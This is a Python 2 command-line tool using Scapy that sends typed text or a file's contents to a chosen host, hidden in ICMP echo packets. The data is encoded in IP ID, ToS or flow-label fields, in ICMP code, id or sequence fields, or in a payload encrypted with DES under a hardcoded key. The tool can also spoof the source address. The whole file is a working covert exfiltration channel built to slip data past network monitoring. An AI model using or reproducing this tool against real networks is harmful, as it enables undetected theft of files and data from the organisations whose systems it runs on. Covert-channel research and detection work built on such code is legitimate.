# Copyright 2011 Jake Valletta
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import sys, argparse, time, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #Supress Scapy Warnings
from scapy.all import *
import argparse
from pyDes import *

########To Hex#
def to_hex(inchars):
	return_string='0x'
	if len(inchars)==1: inchars+="\0"
	for char in inchars:
		return_string+= hex(ord(char))[2:] if len(hex(ord(char))[2:])==2 else '0'+hex(ord(char))[2:]
	return int(return_string, 16)

#########Send File#
def send_file(infile_name):
	global field
	try: f = open(infile_name, 'r')
	except IOError:	print "Error reading file. Quiting.", exit(1)
	write_packets( f.read() )
	
###########Write Packet#
def write_packets(intext):
	global field
	global source
	global destionation
	global ipv4
	global throttle
	intext+="\n"
	
	###Defaults
	ip_id = random.randrange(0x0, 0x0099, 1)
	icmp_id = random.randrange(0x0, 0x0099, 1)
	default_payload = 'abcdefghijklmnopqrstuvwabcdefghi'
	payload_key = '$3Cr371!'
	
	if (ipv4): 
		packet=Ether()/IP(dst=destination, tos=0x0, id=ip_id, ttl=128)/ICMP(type=8, code=0, seq=0, id=icmp_id)/default_payload
		if source != '': packet['IP'].src = source
	else: 
		packet=Ether()/IPv6(version=6L, dst=destination, fl=0L, tc=0L, nh=0x3a)/ICMPv6EchoRequest(type=128, code=0, seq=0, id=icmp_id, data=default_payload)
		if source != '': packet['IPv6'].src = source		
		
	while len(intext) != 0:
		if field=='ip_id':		##Two bytes
			if (ipv4): packet['IP'].id = to_hex(intext[0:2])
			else: packet['IPv6'].fl = to_hex(intext[0:2])
			sendp(packet, verbose=0)			
			intext=intext[2:]
			
		elif field =='ip_tos':	##One byte
			if (ipv4): packet['IP'].tos = int(hex(ord(intext[0:1])), 16)
			else: packet['IPv6'].tc = int(hex(ord(intext[0:1])), 16)
			sendp(packet, verbose=0)			
			intext=intext[1:]
						
		elif field =='icmp_code':	##One byte
			if (ipv4): packet['ICMP'].code = int(hex(ord(intext[0:1])), 16)
			else: packet['ICMPv6 Echo Request'].code = int(hex(ord(intext[0:1])), 16)
			sendp(packet, verbose=0)			
			intext=intext[1:]			
			
		elif field =='icmp_id':		##Two byte
			if (ipv4): packet['ICMP'].id = to_hex(intext[0:2])
			else: packet['ICMPv6 Echo Request'].id = to_hex(intext[0:2])
			sendp(packet, verbose=0)
			intext=intext[2:]
			
		elif field =='icmp_seq':	##Two byte	
			if (ipv4): packet['ICMP'].seq = to_hex(intext[0:2])
			else: packet['ICMPv6 Echo Request'].seq = to_hex(intext[0:2])
			sendp(packet, verbose=0)			
			intext=intext[2:]
			
		elif field =='payload':		##24? bytes
			send_text=intext[0:24]
			while len(send_text)<=23:
				send_text+="\0"
			des_key = des( payload_key, CBC, "\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
			if (ipv4): packet.load = des_key.encrypt(send_text)
			else: packet['ICMPv6 Echo Request'].data = des_key.encrypt(send_text)
			try: intext=intext[24:]
			except: pass
			sendp(packet, verbose=0)
						
		if (ipv4): packet['ICMP'].seq+=1
		else: packet['ICMPv6 Echo Request'].seq+=1
		if (ipv4): packet['IP'].id+=1
		time.sleep(throttle)
		
#############Main##
ipv4=1
ipv6=0
parser = argparse.ArgumentParser(prog=sys.argv[0])
parser.add_argument('-d', metavar='<destination>', dest='destination', required=True, help='Destination to send the message to.')
parser.add_argument('-s', metavar='<source>', dest='source', help='Spoof the source address.')
parser.add_argument('-4', metavar='', dest='4', action='store_const', const="on", default="on", help='Use IP/ICMPv4.')
parser.add_argument('-6', metavar='', dest='6', action='store_const', const="on", default="off", help='Use IP/ICMPv6.')
parser.add_argument('-f', metavar='<field>', required="yes", dest='field', choices=['ip_id', 'ip_tos', 'icmp_code', 'icmp_seq', 'icmp_id', 'payload'],
							default='payload',help="Which field to use. [ip_id, ip_tos, icmp_code, icmp_seq, icmp_id, payload]")
parser.add_argument('-r', metavar='<input_file>', dest='file', default='', help="Send contents of a file via channel")
parser.add_argument('-t', metavar='<throttle>', dest='throttle', default='0', help="Set the throttle speend (in seconds)")
args = parser.parse_args()

destination = args.__dict__['destination']
source = args.__dict__['source']
field = args.__dict__['field']
input_file = args.__dict__['file']
throttle = int(args.__dict__['throttle'])

if args.__dict__['6'] == "on": 
	ipv4=0	
	ipv6=1	

if (input_file==''):
	while 1:
		text = raw_input("Enter text to send: ")
		write_packets(text)
else:
	send_file(input_file)
	

